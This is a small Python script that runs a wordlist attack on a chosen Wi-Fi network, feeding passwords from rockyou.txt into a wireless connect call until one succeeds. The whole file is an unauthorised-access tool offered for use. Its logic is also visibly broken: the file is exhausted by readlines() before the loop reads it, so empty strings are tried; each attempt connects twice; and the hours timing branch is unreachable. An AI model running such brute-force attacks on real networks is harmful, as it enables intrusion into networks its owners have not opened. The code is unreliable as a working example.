import time
from wireless import Wireless

target_SSID = input("enter the target SSID: ")
file_path = "./rockyou.txt"
time_start = time.time() 		#start clock
wireless = Wireless()
with open(file_path, "r", errors='replace') as f:
	doc_len = len(f.readlines())
	for _ in range(doc_len):
		#========pull passwords from file line by line======
		potential_password = f.readline()
		#========strip passwords of new line char===========
		potential_password = potential_password.rstrip('\n')
		#========ATTEMPT WIFI LOGIN HERE====================
		wireless.connect(ssid=target_SSID, password=potential_password)
		if (wireless.connect(ssid=target_SSID, password=potential_password) == True):
			print('password for SSID "' + target_SSID + '" is ' + potential_password)
			print(potential_password)
			break
#time.sleep(300)
time_stop = time.time()			#end clock
time_check = time_stop - time_start
if (time_check > 60):			#convert time to minutes and print
	tt_complete = str((time_stop - time_start) / 60)
	print("time to complete: " + tt_complete + " minutes")
elif (time_check > 3600):	#convert time to hours and print
	tt_complete = str((time_stop - time_start) / 3600)
	print("time to complete: " + tt_complete + " hours")
else:						#print time in seconds
	tt_complete = str(time_stop - time_start)
	print("time to complete: " + tt_complete + " seconds")